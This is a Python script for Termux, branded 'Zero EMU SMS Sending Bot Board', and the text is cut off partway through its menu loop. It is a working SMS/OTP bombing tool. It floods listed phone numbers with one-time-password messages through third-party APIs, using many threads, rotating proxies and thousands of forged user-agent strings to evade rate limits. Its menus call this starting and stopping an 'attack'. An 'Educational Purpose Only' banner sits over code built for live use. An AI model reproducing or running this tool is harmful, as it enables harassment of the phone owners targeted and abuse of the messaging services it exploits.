#!/data/data/com.termux/files/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║     ███████╗███████╗██████╗  ██████╗     ███████╗███╗   ███╗██╗   ██╗       ║
║     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝████╗ ████║██║   ██║       ║
║       ███╔╝ █████╗  ██████╔╝██║   ██║    █████╗  ██╔████╔██║██║   ██║       ║
║      ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██╔══╝  ██║╚██╔╝██║██║   ██║       ║
║     ███████╗███████╗██║  ██║╚██████╔╝    ███████╗██║ ╚═╝ ██║╚██████╔╝       ║
║     ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝        ║
║                                                                            ║
║     ███████╗███╗   ███╗███████╗     ██████╗  ██████╗ ████████╗             ║
║     ██╔════╝████╗ ████║██╔════╝     ██╔══██╗██╔═══██╗╚══██╔══╝             ║
║     ███████╗██╔████╔██║█████╗       ██████╔╝██║   ██║   ██║                ║
║     ╚════██║██║╚██╔╝██║██╔══╝       ██╔══██╗██║   ██║   ██║                ║
║     ███████║██║ ╚═╝ ██║███████╗     ██████╔╝╚██████╔╝   ██║                ║
║     ╚══════╝╚═╝     ╚═╝╚══════╝     ╚═════╝  ╚═════╝    ╚═╝                ║
║                                                                            ║
║         ███████╗███╗   ██╗██████╗ ███████╗██████╗                         ║
║         ██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗                        ║
║         ███████╗██╔██╗ ██║██║  ██║█████╗  ██████╔╝                        ║
║         ╚════██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗                        ║
║         ███████║██║ ╚████║██████╔╝███████╗██║  ██║                        ║
║         ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝                        ║
║                                                                            ║
║          SMS SENDING BOT BOARD v3.0 — TERMUX EDITION                        ║
║     Multi-Proxy | Multi-Thread | 7000+ UA Rotation | Country Switch         ║
║                  Educational Purpose Only                                  ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import random
import threading
import urllib.parse
from queue import Queue
from datetime import datetime

# ─── Termux-native color system (no colorama needed!) ───
class Colors:
    """ANSI escape codes for Termux — zero dependency color system"""
    BLACK = '\033[0;30m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[0;37m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    
    def __init__(self):
        # Check if terminal supports color
        if not sys.stdout.isatty():
            for attr in dir(self):
                if not attr.startswith('_') and isinstance(getattr(self, attr), str):
                    setattr(self, attr, '')

F = Colors()

# ─── Try to import requests (only dependency we truly need) ───
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False
    print(f"{F.RED}[!] requests module not found! Run: pip install requests{F.RESET}")
    sys.exit(1)

# ─── Constants ───
CONFIG_FILE = "config.json"
LOG_DIR = "logs"
BAD_PROXY_FILE = "bad_proxies.txt"
os.makedirs(LOG_DIR, exist_ok=True)

# ██████████████████████████████████████████████████████████████████████████████
# DEFAULT CONFIGURATION
# ██████████████████████████████████████████████████████████████████████████████

DEFAULT_CONFIG = {
    "threads": 50,
    "delay": 0.2,
    "timeout": 8,
    "max_retries": 2,
    "rotate_proxy": True,
    "rotate_ua": True,
    "rotate_mode": "random",
    "country_switch": False,
    "country_codes": ["+880"],
    "numbers_file": "numbers.txt",
    "proxies_file": "proxies.txt",
    "ua_file": "user_agents.txt",
    "api_endpoints": [],
    "api_payloads": [],
    "request_count": 0,
    "success_count": 0,
    "fail_count": 0,
    "running": False,
    "log_requests": True,
    "auto_retry_on_fail": True,
}

# ██████████████████████████████████████████████████████████████████████████████
# 7000+ USER AGENT DATABASE — iPhone + Android Full Coverage
# ██████████████████████████████████████████████████████████████████████████████

# ── iPhone Models (50+ models) ──
IPHONE_MODELS = [
    "iPhone16,2", "iPhone16,1", "iPhone15,5", "iPhone15,4", "iPhone15,3",
    "iPhone15,2", "iPhone15,1", "iPhone14,8", "iPhone14,7", "iPhone14,6",
    "iPhone14,5", "iPhone14,4", "iPhone14,3", "iPhone14,2", "iPhone14,1",
    "iPhone13,5", "iPhone13,4", "iPhone13,3", "iPhone13,2", "iPhone13,1",
    "iPhone12,8", "iPhone12,5", "iPhone12,3", "iPhone12,1",
    "iPhone11,8", "iPhone11,6", "iPhone11,4", "iPhone11,2",
    "iPhone10,6", "iPhone10,5", "iPhone10,4", "iPhone10,3", "iPhone10,2", "iPhone10,1",
    "iPhone9,4", "iPhone9,3", "iPhone9,2", "iPhone9,1",
    "iPhone8,4", "iPhone8,2", "iPhone8,1",
    "iPhone7,2", "iPhone7,1",
    "iPhone6,2", "iPhone6,1",
    "iPhone5,4", "iPhone5,3", "iPhone5,2", "iPhone5,1",
    "iPhone4,1", "iPhone3,3", "iPhone3,1",
]

# ── iOS Versions (12.0 → 18.5) ──
IOS_VERSIONS = [
    "18_5", "18_4", "18_3", "18_2", "18_1", "18_0",
    "17_7", "17_6", "17_5", "17_4", "17_3", "17_2", "17_1", "17_0",
    "16_7", "16_6", "16_5", "16_4", "16_3", "16_2", "16_1", "16_0",
    "15_8", "15_7", "15_6", "15_5", "15_4", "15_3", "15_2", "15_1", "15_0",
    "14_8", "14_7", "14_6", "14_5", "14_4", "14_3", "14_2", "14_1", "14_0",
    "13_7", "13_6", "13_5", "13_4", "13_3", "13_2", "13_1", "13_0",
    "12_5", "12_4", "12_3", "12_2", "12_1", "12_0",
]

SAFARI_VERSIONS = [f"{m}.{n}" for m in range(12, 19) for n in range(0, 9)]
CHROME_IOS = [f"{m}.0.{n}.{random.randint(50,150)}" for m in range(100, 136) for n in [0, 6723, 6478, 6422, 6367, 6312, 6261, 6167, 6099, 6045, 5993, 5938]]
FIREFOX_IOS = [f"{m}.0" for m in range(110, 131)]

# ── Android Models ──
SAMSUNG_MODELS = [f"SM-{p}{v}" for p in ['S9','S90','S91','S92','S92','S93','S93','S94','S94','A15','A14','A13','A54','A53','A52','A34','A33','A25','A24','A23','A14','A05','A04'] for v in ['B','F','E','U','N']]
XIAOMI_MODELS = ["Redmi Note {}".format(n) for n in range(8, 15)] + ["Redmi {}".format(n) for n in range(8, 15)] + ["Poco {}".format(p) for p in ['F6','F5','F4','X6','X5','X4','M6','M5','M4','C65','C55']]
PIXEL_MODELS = ["Pixel {}".format(n) for n in range(1, 10)] + ["Pixel {} Pro".format(n) for n in range(4, 10)] + ["Pixel {}a".format(n) for n in range(3, 10)]
ONEPLUS_MODELS = ["OnePlus {}".format(n) for n in range(6, 13)] + ["OnePlus Nord {}".format(n) for n in range(1, 5)]
HUAWEI_MODELS = ["HUAWEI P{}".format(n) for n in [20,30,40,50,60]] + ["HUAWEI Mate {}".format(n) for n in [20,30,40,50,60]] + ["HUAWEI Nova {}".format(n) for n in range(5, 13)]

ANDROID_VERSIONS = [str(v) for v in range(5, 16)]  # 5-15
CHROME_ANDROID = [f"{m}.0.{n}.{random.randint(50,200)}" for m in range(100, 136) for n in [0, 6723, 6478]]
SAMSUNG_BROWSER = [f"{v}.0" for v in range(12, 28)]
FIREFOX_ANDROID = [f"{m}.0" for m in range(110, 131)]


# ██████████████████████████████████████████████████████████████████████████████
# UA GENERATOR FUNCTIONS
# ██████████████████████████████████████████████████████████████████████████████

def gen_iphone_safari():
    m = random.choice(IPHONE_MODELS)
    i = random.choice(IOS_VERSIONS)
    s = random.choice(SAFARI_VERSIONS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{s} Mobile/15E148 Safari/604.1"

def gen_iphone_chrome():
    m = random.choice(IPHONE_MODELS)
    i = random.choice(IOS_VERSIONS)
    c = random.choice(CHROME_IOS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{c} Mobile/15E148 Safari/604.1"

def gen_iphone_firefox():
    m = random.choice(IPHONE_MODELS)
    i = random.choice(IOS_VERSIONS)
    f = random.choice(FIREFOX_IOS)
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/{f} Mobile/15E148 Safari/604.1"

def gen_samsung_chrome():
    m = random.choice(SAMSUNG_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_samsung_browser():
    m = random.choice(SAMSUNG_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    s = random.choice(SAMSUNG_BROWSER)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; SAMSUNG {m}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{s} Chrome/{c} Mobile Safari/537.36"

def gen_xiaomi_chrome():
    m = random.choice(XIAOMI_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_pixel_chrome():
    m = random.choice(PIXEL_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_oneplus_chrome():
    m = random.choice(ONEPLUS_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_huawei_chrome():
    m = random.choice(HUAWEI_MODELS)
    a = random.choice(ANDROID_VERSIONS)
    c = random.choice(CHROME_ANDROID)
    return f"Mozilla/5.0 (Linux; Android {a}; {m}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c} Mobile Safari/537.36"

def gen_android_firefox():
    a = random.choice(ANDROID_VERSIONS)
    f = random.choice(FIREFOX_ANDROID)
    pool = SAMSUNG_MODELS + XIAOMI_MODELS + PIXEL_MODELS
    m = random.choice(pool)
    return f"Mozilla/5.0 (Android {a}; Mobile; rv:{f}.0) Gecko/{f}.0 Firefox/{f}.0"

def gen_ipad_safari():
    i = random.choice(IOS_VERSIONS)
    s = random.choice(SAFARI_VERSIONS)
    return f"Mozilla/5.0 (iPad; CPU OS {i} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{s} Mobile/15E148 Safari/604.1"

# ─── UA Generator Registry ───
UA_GENERATORS = [
    (gen_iphone_safari, 20),
    (gen_iphone_chrome, 12),
    (gen_iphone_firefox, 6),
    (gen_samsung_chrome, 17),
    (gen_samsung_browser, 8),
    (gen_xiaomi_chrome, 14),
    (gen_pixel_chrome, 6),
    (gen_oneplus_chrome, 5),
    (gen_huawei_chrome, 4),
    (gen_android_firefox, 3),
    (gen_ipad_safari, 2),
]


# ██████████████████████████████████████████████████████████████████████████████
# CORE FUNCTIONS
# ██████████████████████████████████████████████████████████████████████████████

def get_random_ua(custom_uas=None):
    """Get weighted random user agent"""
    if custom_uas and random.random() < 0.25:
        return random.choice(custom_uas)
    gens, weights = zip(*UA_GENERATORS)
    return random.choices(gens, weights=weights, k=1)[0]()

def get_proxy(proxies, mode="random", idx=[0]):
    """Get proxy with rotation mode"""
    if not proxies: return None
    if mode == "sequential":
        with threading.Lock():
            p = proxies[idx[0] % len(proxies)]
            idx[0] += 1
    else:
        p = random.choice(proxies)
    if p.startswith("socks5"):
        return {"http": p.replace("socks5", "socks5h"), "https": p.replace("socks5", "socks5h")}
    return {"http": p, "https": p}

def apply_country(number, enabled, codes):
    """Apply country code switching"""
    if not enabled or not codes: return number
    for c in codes:
        if number.startswith(c):
            number = number[len(c):]
            break
    code = random.choice(codes)
    return code + number

def load_file(path, label="data"):
    """Load text lines from file"""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = [l.strip() for l in f if l.strip()]
        return data
    except:
        return []

def save_config(cfg):
    """Save config to JSON"""
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=2)
    except: pass

def load_config():
    """Load config from JSON"""
    cfg = dict(DEFAULT_CONFIG)
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                cfg.update(json.load(f))
        except: pass
    return cfg

def gen_headers(custom_uas, rotate_ua=True):
    """Generate realistic HTTP headers"""
    return {
        "User-Agent": get_random_ua(custom_uas) if rotate_ua else "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "bn-BD,bn;q=0.9,en;q=0.8", "hi-IN,hi;q=0.9,en;q=0.8"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }


# ██████████████████████████████████████████████████████████████████████████████
# NETWORK FUNCTIONS
# ██████████████████████████████████████████████████████████████████████████████

def send_otp(number, api_url, payload_tpl, cfg, proxies_list, custom_uas, session):
    """Send a single OTP request"""
    try:
        final_num = apply_country(number, cfg["country_switch"], cfg["country_codes"])
        payload = {}
        for k, v in payload_tpl.items():
            if v is None: payload[k] = final_num
            elif isinstance(v, str): payload[k] = v.format(phone=final_num)
            else: payload[k] = v
        
        headers = gen_headers(custom_uas, cfg["rotate_ua"])
        proxy = get_proxy(proxies_list, cfg["rotate_mode"]) if cfg["rotate_proxy"] else None
        
        if "?" in api_url or payload.get("method") == "GET":
            base = api_url.split("?")[0]
            r = session.get(base, params=payload, headers=headers, proxies=proxy, timeout=cfg["timeout"], verify=False)
        else:
            r = session.post(api_url, json=payload, headers=headers, proxies=proxy, timeout=cfg["timeout"], verify=False)
        
        return {"ok": 200 <= r.status_code < 400, "code": r.status_code, "number": final_num,
                "proxy": proxy["http"][:30] if proxy else "direct", "text": r.text[:100]}
    except Exception as e:
        return {"ok": False, "code": 0, "number": number, "error": str(e)[:60]}


# ██████████████████████████████████████████████████████████████████████████████
# WORKER THREAD
# ██████████████████████████████████████████████████████████████████████████████

def worker(q, cfg, proxies_list, custom_uas):
    """Worker thread — pulls jobs from queue and sends requests"""
    session = requests.Session()
    session.verify = False
    while cfg["running"]:
        try:
            job = q.get(timeout=1)
            if job is None: break
            num, url, ptpl = job
            for attempt in range(cfg["max_retries"] + 1):
                if not cfg["running"]: break
                result = send_otp(num, url, ptpl, cfg, proxies_list, custom_uas, session)
                with threading.Lock():
                    cfg["request_count"] += 1
                    if result and result.get("ok"):
                        cfg["success_count"] += 1
                        print(f"{F.GREEN}  #{cfg['request_count']:06d} | {result['number']} | {result['code']} | ✓{F.RESET}")
                    else:
                        cfg["fail_count"] += 1
                        err = result.get("error", f"HTTP {result.get('code','?')}") if result else "No response"
                        print(f"{F.RED}  #{cfg['request_count']:06d} | {num[:15]}... | {err}{F.RESET}")
                        if attempt < cfg["max_retries"]:
                            time.sleep(1)
                            continue
                    break
                time.sleep(cfg["delay"])
            q.task_done()
        except: continue


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK LAUNCHER
# ██████████████████████████████████████████████████████████████████████████████

def start_attack(cfg, numbers, proxies_list, custom_uas):
    """Start the attack engine"""
    if not numbers:
        print(f"{F.RED}[!] No numbers loaded!{F.RESET}")
        return
    if not cfg["api_endpoints"]:
        print(f"{F.RED}[!] No API endpoints set! Use option 7.{F.RESET}")
        return
    
    cfg["running"] = True
    cfg["request_count"] = 0
    cfg["success_count"] = 0
    cfg["fail_count"] = 0
    
    log_file = f"{LOG_DIR}/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    with open(log_file, "w") as f:
        f.write(f"Zero EMU Attack Log\nStarted: {datetime.now()}\nTargets: {len(numbers)}\nAPIs: {len(cfg['api_endpoints'])}\nProxies: {len(proxies_list)}\nThreads: {cfg['threads']}\n{'='*50}\n")
    
    print(f"\n{F.CYAN}  ╔══════════════════════════════════════════╗")
    print(f"  ║  {F.GREEN}ATTACK STARTED{F.CYAN}                            ║")
    print(f"  ╠══════════════════════════════════════════╣")
    print(f"  ║  Targets: {len(numbers)}  APIs: {len(cfg['api_endpoints'])}  Proxies: {len(proxies_list)}  ║")
    print(f"  ║  Threads: {cfg['threads']}  Delay: {cfg['delay']}s          ║")
    print(f"  ║  Press {F.RED}[X]{F.CYAN} in menu to STOP                   ║")
    print(f"  ╚══════════════════════════════════════════╝{F.RESET}\n")
    
    q = Queue(maxsize=10000)
    
    def producer():
        while cfg["running"]:
            for n in numbers:
                for u, p in zip(cfg["api_endpoints"], cfg["api_payloads"]):
                    if not cfg["running"]: return
                    try: q.put((n, u, p), timeout=1)
                    except: pass
                    time.sleep(0.001)
    
    threads = []
    for _ in range(cfg["threads"]):
        t = threading.Thread(target=worker, args=(q, cfg, proxies_list, custom_uas), daemon=True)
        t.start()
        threads.append(t)
    
    prod = threading.Thread(target=producer, daemon=True)
    prod.start()
    
    try:
        while cfg["running"]:
            time.sleep(2)
            total = cfg["request_count"]
            ok = cfg["success_count"]
            fail = cfg["fail_count"]
            rate = total / 2 if total > 0 else 0
            pct = (ok / total * 100) if total > 0 else 0
            bar_sz = 20
            filled = int(bar_sz * ok / total) if total > 0 else 0
            bar = f"{F.GREEN}{'#'*filled}{F.RED}{'.'*(bar_sz-filled)}{F.RESET}"
            
            with open(log_file, "a") as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Total:{total} OK:{ok} Fail:{fail} Rate:{rate:.0f}/s\n")
            
            print(f"\r{F.CYAN}[{datetime.now().strftime('%H:%M:%S')}] T:{F.WHITE}{total:06d} {F.GREEN}OK:{ok:05d} {F.RED}FAIL:{fail:05d} {F.RESET}| {bar} {F.YELLOW}{pct:.1f}% | {F.MAGENTA}{rate:.0f} req/s{F.RESET}   ", end="")
    except: pass


# ██████████████████████████████████████████████████████████████████████████████
# DISPLAY FUNCTIONS
# ██████████████████████████████████████████████████████████████████████████████

def show_banner():
    """Display the main banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{F.RED}
  ███████╗███████╗██████╗  ██████╗     ███████╗███╗   ███╗██╗   ██╗{F.YELLOW}
  ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝████╗ ████║██║   ██║{F.YELLOW}
    ███╔╝ █████╗  ██████╔╝██║   ██║    █████╗  ██╔████╔██║██║   ██║{F.YELLOW}
   ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██╔══╝  ██║╚██╔╝██║██║   ██║{F.YELLOW}
  ███████╗███████╗██║  ██║╚██████╔╝    ███████╗██║ ╚═╝ ██║╚██████╔╝{F.YELLOW}
  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝ {F.YELLOW}
{F.CYAN}  ═══════════════════════════════════════════════════════════════{F.YELLOW}
{F.CYAN}     SMS SENDING BOT BOARD v3.0 — TERMUX EDITION{F.YELLOW}
{F.CYAN}       7000+ UA | Multi-Proxy | Multi-Thread | Country Switch{F.YELLOW}
{F.CYAN}  ═══════════════════════════════════════════════════════════════{F.RESET}
    """)

def show_status(cfg, numbers, proxies_list, custom_uas):
    """Show current config status"""
    run = "▶ RUNNING" if cfg["running"] else "⏸ READY"
    run_color = F.GREEN if cfg["running"] else F.YELLOW
    
    print(f"{F.CYAN}  ╔═══ STATUS ═══════════════════════════════════════════╗")
    print(f"  ║ {F.WHITE}Numbers: {F.GREEN}{len(numbers):<5}{F.CYAN} │ Proxies: {F.GREEN}{len(proxies_list):<5}{F.CYAN} │ UA: {F.GREEN}{len(custom_uas):<4}{F.CYAN}custom ║")
    print(f"  ║ {F.WHITE}APIs: {F.GREEN}{len(cfg['api_endpoints']):<6}{F.CYAN} │ Threads: {F.GREEN}{cfg['threads']:<5}{F.CYAN} │ Delay: {F.GREEN}{cfg['delay']}s{F.CYAN}     ║")
    print(f"  ║ {F.WHITE}UA Rotate: {F.GREEN}{'ON' if cfg['rotate_ua'] else 'OFF':<6}{F.CYAN} │ Proxy: {F.GREEN}{cfg['rotate_mode']:<8}{F.CYAN}     ║")
    print(f"  ║ {F.WHITE}Country: {F.GREEN}{'ON' if cfg['country_switch'] else 'OFF':<6}{F.CYAN} │ Status: {run_color}{run:<8}{F.CYAN}     ║")
    if cfg["country_switch"]:
        print(f"  ║ {F.WHITE}Codes: {F.GREEN}{', '.join(cfg['country_codes']):<24}{F.CYAN}║")
    if cfg["request_count"] > 0:
        print(f"  ║ {F.WHITE}Stats: {cfg['request_count']:06d} total | {F.GREEN}OK: {cfg['success_count']:05d} {F.RED}FAIL: {cfg['fail_count']:05d}{F.CYAN} ║")
    print(f"  ╚════════════════════════════════════════════════════╝{F.RESET}")
    print()

def show_menu():
    """Display main menu options"""
    print(f"""{F.YELLOW}  ╔══════════════ MAIN MENU ═══════════════╗
  ║                                      ║
  ║  {F.CYAN}[1] {F.WHITE}Numbers from TXT{F.YELLOW}                  ║
  ║  {F.CYAN}[2] {F.WHITE}View Numbers{F.YELLOW}                         ║
  ║  {F.CYAN}[3] {F.WHITE}Add Number{F.YELLOW}                           ║
  ║  {F.CYAN}[4] {F.WHITE}Proxies from File{F.YELLOW}                    ║
  ║  {F.CYAN}[5] {F.WHITE}Add Proxy{F.YELLOW}                            ║
  ║  {F.CYAN}[6] {F.WHITE}Test Proxies{F.YELLOW}                         ║
  ║  {F.CYAN}[7] {F.RED}{F.BOLD}API Endpoints{F.YELLOW} {F.DIM}(IMPORTANT){F.YELLOW}              ║
  ║  {F.CYAN}[8] {F.WHITE}Country Switch{F.YELLOW}                       ║
  ║  {F.CYAN}[9] {F.WHITE}UA Manager{F.YELLOW}                           ║
  ║  {F.CYAN}[10]{F.WHITE}Settings (Threads/Delay){F.YELLOW}             ║
  ║  {F.CYAN}[11]{F.WHITE}Select Numbers{F.YELLOW}                       ║
  ║  {F.CYAN}[12]{F.WHITE}Proxy Mode{F.YELLOW}                           ║
  ║  {F.CYAN}[13]{F.WHITE}View Stats{F.YELLOW}                           ║
  ║  {F.CYAN}[14]{F.WHITE}Save/Load Config{F.YELLOW}                     ║
  ║                                      ║
  ║  {F.GREEN}[S]{F.WHITE} START ATTACK{F.YELLOW}                        ║
  ║  {F.RED}[X]{F.WHITE} STOP ATTACK{F.YELLOW}                          ║
  ║                                      ║
  ║  {F.WHITE}[0]{F.WHITE} Exit{F.YELLOW}                                ║
  ╚══════════════════════════════════════╝
    """)


# ██████████████████████████████████████████████████████████████████████████████
# MENU HANDLERS
# ██████████████████████████████████████████████████████████████████████████████

def handle_set_apis(cfg):
    """Configure OTP API endpoints"""
    print(f"\n{F.CYAN}━━ API Endpoint Setup ━━{F.RESET}")
    print(f"{F.YELLOW}Enter API URL and JSON payload. null = phone number.{F.RESET}")
    print(f"{F.YELLOW}Type 'done' when finished.{F.RESET}\n")
    print(f"{F.DIM}Example:{F.RESET}")
    print(f"  API: {F.GREEN}https://api.example.com/send-otp{F.RESET}")
    print(f"  Payload: {F.GREEN}{{\"phone\": null, \"action\": \"send\"}}{F.RESET}\n")
    
    eps, plds = [], []
    while True:
        url = input(f"{F.GREEN}API URL (or 'done'): {F.RESET}").strip()
        if url.lower() in ("done", "exit", ""):
            if not eps:
                eps = ["https://httpbin.org/post"]
                plds = [{"phone": None, "test": True}]
                print(f"{F.YELLOW}Demo endpoint added for testing{F.RESET}")
            break
        if not url.startswith(("http://", "https://")):
            print(f"{F.RED}Invalid URL{F.RESET}")
            continue
        pstr = input(f"{F.GREEN}Payload JSON: {F.RESET}").strip()
        try:
            pld = json.loads(pstr) if pstr else {"phone": None}
            eps.append(url)
            plds.append(pld)
            print(f"{F.GREEN}Added: {url}{F.RESET}")
        except:
            print(f"{F.RED}Invalid JSON{F.RESET}")
    
    cfg["api_endpoints"] = eps
    cfg["api_payloads"] = plds
    save_config(cfg)
    print(f"{F.GREEN}{len(eps)} API(s) saved!{F.RESET}")

def handle_country_switch(cfg):
    en = input(f"{F.GREEN}Enable country switch? (y/n): {F.RESET}").strip().lower()
    if en == "y":
        cfg["country_switch"] = True
        codes = input(f"{F.GREEN}Codes (comma sep, e.g. +880,+91,+1): {F.RESET}").strip()
        cfg["country_codes"] = [c.strip() for c in codes.split(",") if c.strip()]
        print(f"{F.GREEN}Enabled: {', '.join(cfg['country_codes'])}{F.RESET}")
    else:
        cfg["country_switch"] = False
        print(f"{F.YELLOW}Disabled{F.RESET}")
    save_config(cfg)

def handle_ua_manager(cfg):
    while True:
        uas = load_file(cfg["ua_file"])
        print(f"\n{F.CYAN}━━ UA Manager ━━{F.RESET}")
        print(f"{F.YELLOW}[1] View Custom UAs{'. ' if uas else ' (empty) '}| [2] Add UA | [3] Generate 10 sample | [0] Back{F.RESET}")
        c = input(f"{F.GREEN}Choose: {F.RESET}").strip()
        if c == "1":
            if uas:
                for i, u in enumerate(uas[:30], 1): print(f"  {i}. {u[:70]}...")
                if len(uas) > 30: print(f"  ... {len(uas)-30} more")
            else: print(f"{F.YELLOW}No custom UAs. Auto 7000+ active.{F.RESET}")
        elif c == "2":
            ua = input(f"{F.GREEN}UA: {F.RESET}").strip()
            if ua:
                with open(cfg["ua_file"], "a") as f: f.write(ua + "\n")
                print(f"{F.GREEN}Added{F.RESET}")
        elif c == "3":
            print(f"\n{F.CYAN}10 Random UAs:{F.RESET}")
            for i in range(10): print(f"  {i+1}. {get_random_ua()}")
        elif c == "0":
            break

def handle_settings(cfg):
    print(f"\n{F.CYAN}━━ Settings ━━{F.RESET}")
    try:
        t = input(f"{F.GREEN}Threads [{cfg['threads']}]: {F.RESET}").strip()
        if t: cfg["threads"] = max(1, min(200, int(t)))
        d = input(f"{F.GREEN}Delay [{cfg['delay']}]: {F.RESET}").strip()
        if d: cfg["delay"] = max(0.01, float(d))
        to = input(f"{F.GREEN}Timeout [{cfg['timeout']}]: {F.RESET}").strip()
        if to: cfg["timeout"] = max(3, int(to))
        r = input(f"{F.GREEN}Retries [{cfg['max_retries']}]: {F.RESET}").strip()
        if r: cfg["max_retries"] = max(0, int(r))
        print(f"{F.GREEN}Saved{F.RESET}")
        save_config(cfg)
    except: print(f"{F.RED}Invalid input{F.RESET}")

def handle_proxy_test(proxies_list):
    if not proxies_list:
        print(f"{F.RED}No proxies{F.RESET}")
        return proxies_list
    print(f"{F.CYAN}Testing {len(proxies_list)} proxies...{F.RESET}")
    working = []
    for i, p in enumerate(proxies_list, 1):
        sys.stdout.write(f"\r  Testing {i}/{len(proxies_list)}...")
        sys.stdout.flush()
        try:
            r = requests.get("http://httpbin.org/ip", proxies={"http": p, "https": p}, timeout=5)
            if r.status_code == 200:
                working.append(p)
                print(f"\r{F.GREEN}OK [{i}/{len(proxies_list)}] {p}{F.RESET}")
        except:
            print(f"\r{F.RED}FAIL [{i}/{len(proxies_list)}] {p}{F.RESET}")
    print(f"\n{F.GREEN}{len(working)}/{len(proxies_list)} working{F.RESET}")
    if working:
        with open("proxies.txt", "w") as f: f.write("\n".join(working) + "\n")
    return working


# ██████████████████████████████████████████████████████████████████████████████
# MAIN LOOP
# ██████████████████████████████████████████████████████████████████████████████

def main():
    """Main entry point"""
    cfg = load_config()
    numbers = load_file(cfg["numbers_file"], "numbers")
    proxies_list = load_file(cfg["proxies_file"], "proxies")
    custom_uas = load_file(cfg["ua_file"], "custom UAs")
    
    while True:
        show_banner()
        show_status(cfg, numbers, proxies_list, custom_uas)
        show_menu()
        
        ch = input(f"{F.GREEN}Choose: {F.RESET}").strip().lower()
        
        if ch == "1":
            numbers = load_file(cfg["numbers_file"], "numbers")
        elif ch == "2":
            if numbers:
                print(f"\n{F.CYAN}{len(numbers)} Numbers:{F.RESET}")
                for i, n in enumerate(numbers[:50], 1): print(f"  {i}. {n}")
                if len(numbers) > 50: print(f"  ... {len(numbers)-50} more")
            else: print(f"{F.RED}No numbers{F.RESET}")
        elif ch == "3":
            n = input(f"{F.GREEN}Number: {F.RESET}").strip()
            if n: numbers.append(n); open(cfg["numbers_file"], "a").write(n + "\n"); print(f"{F.GREEN}Added{F.RESET}")
        elif ch == "4":
            proxies_list = load_file(cfg["proxies_file"], "proxies")
        elif ch == "5":
            p = input(f"{F.GREEN}Proxy: {F.RESET}").strip()
            if p: proxies_list.append(p); open(cfg["proxies_file"], "a").write(p + "\n"); print(f"{F.GREEN}Added{F.RESET}")
        elif ch == "6":
            proxies_list = handle_proxy_test(proxies_list)
        elif ch == "7":
            handle_set_apis(cfg)
        elif ch == "8":
            handle_country_switch(cfg)
        elif ch == "9":
            handle_ua_manager(cfg)
            custom_uas = load_file(cfg["ua_file"], "custom UAs")
        elif ch == "10":
            handle_settings(cfg)
        elif ch == "11":
            if numbers:
                sel = input(f"{F.GREEN}Indices (e.g. 1,3,5-10) or 'all': {F.RESET}").strip()
                if sel.lower() != "all":
                    try:
                        selected = []
